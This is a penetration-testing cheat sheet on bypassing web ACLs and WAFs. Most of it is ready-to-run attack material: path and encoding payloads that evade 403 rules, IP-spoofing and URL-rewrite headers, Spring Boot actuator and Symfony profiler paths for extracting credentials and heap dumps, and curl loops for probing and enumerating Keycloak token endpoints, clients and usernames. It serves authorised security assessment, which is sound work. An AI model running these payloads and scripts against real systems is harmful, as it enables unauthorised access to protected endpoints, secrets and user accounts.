# Web ACL/WAF Bypass Techniques

Collected from real engagements. Test these when encountering 403 on known-existing paths.

## Path-Based Bypasses

```bash
# Case variation (bypasses regex rules matching lowercase only)
/Admin/login    # If WAF blocks /admin/* but not /Admin/*
/ADMIN/login
/aDmin/login

# Path traversal with semicolon (Spring Boot / Tomcat)
/actuator/..;/env       # Bypasses prefix-based ACL
/context/..;/actuator/health

# Double URL encoding
/%2561dmin/login        # %25 = %, so %2561 = %61 = 'a'

# Path normalization
//admin/login
/./admin/login
/admin/./login
/admin;/login

# Null byte (older systems)
/admin/login%00
/admin/login%00.json
```

## Header-Based Bypasses

```bash
# IP spoofing (works if backend trusts these headers)
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Custom-IP-Authorization: 127.0.0.1
CF-Connecting-IP: 127.0.0.1   # Cloudflare-specific

# Host header manipulation
X-Forwarded-Host: localhost
Host: localhost
```

## Spring Boot Actuator Specific

```bash
# Standard actuator paths
/actuator/env           # Environment variables (credentials!)
/actuator/health        # App health + DB connectivity
/actuator/heapdump      # JVM heap (extract secrets)
/actuator/mappings      # All URL mappings
/actuator/configprops   # All configuration
/actuator/beans         # All Spring beans
/actuator/threaddump    # Thread state
/actuator/loggers       # Log levels (can be changed via POST!)
/actuator/metrics       # App metrics

# Bypass patterns when /actuator is 403
/actuator/..;/env
/actuator;/env
/actuator/env.json
/actuator/env/
```

## Pimcore/Symfony Specific

```bash
# Route map exposure (FOSJsRoutingBundle)
/js/routing             # Full admin route map as JSON

# Debug endpoints
/_profiler              # Symfony profiler (tokens, queries, sessions)
/_wdt                   # Web debug toolbar
/_profiler/latest       # Latest profiler token

# Known paths
/admin/login
/bundles/
/var/
/admin/asset/webdav/    # WebDAV access
```

## Keycloak Token Endpoint Discovery via Gateway

When Keycloak is not directly exposed but microservices use it for auth:

```bash
# Probe for Keycloak proxied through the API gateway
for path in \
  "keycloak/realms/{realm}/protocol/openid-connect/token" \
  "auth/realms/{realm}/protocol/openid-connect/token" \
  "sso/realms/{realm}/protocol/openid-connect/token" \
  "realms/{realm}/protocol/openid-connect/token" \
  "oauth/token"; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
    "https://$TARGET/$path" 2>/dev/null)
  [ "$code" != "404" ] && echo "$path: $code"
done
```

**Key indicators:**
- 405 on GET = endpoint exists, needs POST
- 401 on POST with bad creds = endpoint is live and processing auth
- Look for `INGRESSCOOKIE` in Set-Cookie — confirms ingress routing to Keycloak pod

**Once found, enumerate:**
```bash
# Identify public vs confidential clients
# Public clients: "Public client not allowed to retrieve service account"
# Confidential clients: "Invalid client or Invalid client credentials"
for client in admin-cli account {app-name} {app-name}-api; do
  curl -sk -X POST "$TOKEN_URL" \
    -d "grant_type=client_credentials&client_id=$client&client_secret=x" | jq .error_description
done
```

**Public clients (admin-cli, account) enable password grant:**
```bash
curl -sk -X POST "$TOKEN_URL" \
  -d "grant_type=password&client_id=admin-cli&username=USER&password=PASS"
```

## Username Enumeration via Keycloak Error Messages

Keycloak differentiates between invalid users and invalid passwords in some configurations:

| Error Message | Meaning |
|---------------|---------|
| `"Invalid user credentials"` | Username EXISTS, password wrong |
| `"Account not found"` or `"Invalid user"` | Username does NOT exist |
| `"Account disabled"` | Username exists, account locked |
| `"Account is not fully set up"` | Username exists, pending setup |

**Note:** Modern Keycloak (17+) has "Login with email" and brute-force detection. Default config returns generic "Invalid user credentials" for both bad user and bad password. But many deployments still leak this distinction. Always test with a known-good username format to calibrate.

## WAF Case-Sensitivity Bypass to Reach Auth-Protected Endpoints

When a WAF/Istio rule blocks paths like `/actuator/*` with 403:

```bash
# Case variation bypasses regex-based WAF rules
# WAF blocks: /bpm/actuator/health → 403
# Bypass:     /bpm/Actuator/Health → 401 (reaches app, needs auth)
#             /bpm/ACTUATOR/HEALTH → 401

# This proves:
# 1. WAF rule is case-sensitive (regex: /actuator/.*)
# 2. Backend (Tomcat/Spring) is case-insensitive for these paths
# 3. The endpoint EXISTS and is only protected by app-level auth
```

**Exploitation value:** The 403→401 transition means the WAF is the ONLY thing blocking unauthenticated access to actuator. If you can get a valid JWT (from any source), the actuator is fully accessible. This is a finding: defense-in-depth failure.

## Key Lessons

1. **403 ≠ 404**: 403 confirms the path exists. Always test bypass techniques.
2. **Case sensitivity matters**: WAF rules often match lowercase only. The application may or may not be case-sensitive — test both.
3. **Inconsistent auth enforcement**: In microservices architectures, some services may lack auth while others enforce it. Always fuzz sibling paths when you find one unprotected endpoint.
4. **Spring Boot `..;/` trick**: Tomcat normalizes `..;/` differently than the reverse proxy. This is a classic bypass for path-prefix ACLs.
5. **500 vs 403 vs 404**: A 500 on a bypassed path means you reached the application but it errored. This is still a bypass — the ACL was defeated even if the app didn't serve useful content.
6. **Secondary ACLs behind path traversal**: Even when `..;/` bypasses ingress path routing (302 → target), a secondary ACL (IP whitelist, IAP, service-level auth) may still return 403. Document the traversal as a finding regardless — it proves the first layer is bypassable and the defense relies on a single remaining control.
7. **Spring Boot CORS "Duplicate key Vary" bug**: When Spring Security has misconfigured CORS filters, ALL POST/PUT requests crash with 500 before reaching application logic. This means: (a) you cannot enumerate real write endpoints via response codes, (b) SSRF via POST body is impossible, (c) the bug itself is a finding (accidental DoS on all write operations).
8. **Envoy sidecar confirmation**: `x-envoy-upstream-service-time` in response headers confirms Istio service mesh is active. CORS `access-control-allow-headers` may leak internal header names (x-auth-app-id, X-Idempotency-Key, x-datadog-*, Traceparent) revealing auth schemes and observability stack.
